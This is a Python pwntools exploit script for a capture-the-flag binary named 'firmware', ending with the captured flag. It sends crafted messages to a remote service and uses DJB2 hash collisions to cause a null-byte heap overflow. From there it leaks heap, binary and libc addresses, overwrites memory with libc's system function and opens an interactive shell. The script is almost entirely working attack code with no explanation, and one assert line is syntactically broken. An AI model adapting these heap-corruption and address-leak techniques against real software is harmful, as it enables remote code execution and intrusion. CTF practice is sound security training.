from pwn import *
import struct, string
from generator import *  # https://github.com/m9psy/DJB2_collision_generator

binary = ELF('./firmware')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

IP, PORT = '3.35.98.10', 13100
DEBUG = False
context.log_level = 'debug'
#context.aslr = False
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if DEBUG:
    p = process('./firmware', env={'LD_PRELOAD': './libjemalloc.so'})
else:
    p = remote(IP, PORT)

# key-value like object
def obj(type, s, data):
    d  = ''
    d += chr(type)
    d += s + '\0'
    d += data
    return d

def obj_str(s, length, dat):
    d  = ''
    d += p32(length)
    d += dat  # possible nul-over if not null-terminated & length is exact
    return obj(0, s, d)

def obj_mem(s, length, dat):
    d  = ''
    d += p32(length)
    d += dat
    return obj(1, s, d)

def obj_dbl(s, val):
    d  = ''
    d += struct.pack('<d', val)
    return obj(2, s, d)

def obj_dbl_with_qw(s, val):
    d  = ''
    d += p64(val)
    return obj(2, s, d)

def obj_qw(s, val):
    d  = ''
    d += p64(val)
    return obj(3, s, d)

def hash(s):
    h = 5381
    for c in s:
        h = (h * 33 + (ord(c) if isinstance(c, str) else c)) & 0xffffffff
    return h

def get_coll(target, exclude=[], length=32):
    hashval = hash(target) if not isinstance(target, int) else target
    gen_collision = GreedyGenerator(djb2_32, hashval, length)
    for c in gen_collision:
        if '\0' not in c and c not in exclude:
            assert hash(str(c)) == hashval
            return str(c)

payload  = ""
payload += obj_str("command", 9, "simulate\0")
payload += obj_qw("altitude", 12345678)
payload += obj_str(get_coll("altitude"), 0x18, 'a'*0x17 + '\0')
payload += obj_dbl("mass", 10.0)
payload += obj_qw("velocity", 1)
payload += obj_dbl("drag", 100.0)
payload += obj_mem(get_coll(0, length=31), 0x20, "a"*0x20)
payload  = p32(len(payload)) + payload

p.send(payload)
p.recvuntil('expected missile impact distance : ')
jeheap_leak = int(p.recvuntil('(m)', drop=True))
p.recvuntil('position\x00')
log.info('jeheap leak: {:016x}'.format(jeheap_leak))

jeheap = jeheap_leak - 0x41e080
assert jeheap & 0xfffff == 0
log.success('jeheap base: {:016x}'.format(jeheap))

# jeheap base: 0x7f424ba00000
# main_obj: 0x7f424be1e000 (offset 0x41e000)
main_obj = jeheap + 0x41e000

payload  = ""
payload += obj_str("command", 7, "launch\0")
payload += obj_str("target", 8, "barrack\0")
payload += obj_qw(get_coll("target"), main_obj)
payload  = p32(len(payload)) + payload
p.send(payload)

p.recvuntil('target ')
binary_leak = p.recv(6) + '\0\0'
binary.address = u64(binary_leak) - 0x1091
assert binary.address & 0xfff == 0
log.success('binary: {:016x}'.format(binary.address))

payload  = ""
payload += obj_str("command", 7, "launch\0")
payload += obj_str("target", 8, "barrack\0")
payload += obj_qw(get_coll("target"), binary.got['snprintf'])
payload  = p32(len(payload)) + payload
p.send(payload)

p.recvuntil('target  ')
binary_leak = p.recv(6) + '\0\0'
libc.address = u64(binary_leak) - libc.symbols['snprintf']
assert libc.address & 0xfff == 0-
log.success('libc: {:016x}'.format(libc.address))

#gdb.attach(p)
log.info('main_obj: {:016x}'.format(main_obj))
#raw_input('waiting... > ')

"""
malloc(0x20):
0x7f532dc1e180 -> 0
0x7f532dc1e060 -> 1
0x7f532dc1e1a0 -> 2
0x7f532dc1e080 -> 3
0x7f532dc1e0a0 -> 4
0x7f532dc1e1e0 -> 5
0x7f532dc1e0e0 -> qw main_obj
0x7f532dc1e200 -> 6
0x7f532dc1e100 -> 7
0x7f532dc1e140 -> 8
0x7f532dc1e120 -> 9
0x7f532dc1e1c0 -> str
0x7f532dc1e0c0 -> str nul-over
"""

payload  = ""
for i in range(0, 6):
    payload += obj_qw(str(i), 0)
payload += obj_qw('M', main_obj)
for i in range(6, 10):
    payload += obj_qw(str(i), 0)
payload += obj_str("b", 0x20, 'a'*0x20)
payload += obj_str("command", 7, "reload\0")
payload += obj_qw("amount", 0)
payload  = p32(len(payload)) + payload
p.send(payload)
p.recvuntil('success\0')

payload  = ""
payload += obj_qw('/bin/sh;', 0)
for i in range(6):
    payload += obj_mem('yeet' + str(i), 0x18, p64(0x00007fffdead0000 + i) + 'a'*0x10)
payload += obj_mem('yeet!', 0x18, p64(libc.symbols['system']) + 'a'*0x10)
payload += obj_str("command", 7, "reload\0")
payload += obj_qw("amount", 0)
payload  = p32(len(payload)) + payload
p.send(payload)

p.interactive()

### flag{WARNING-the_toxic_NULLBYTE_injected_into_system-We_losing_control!} ###
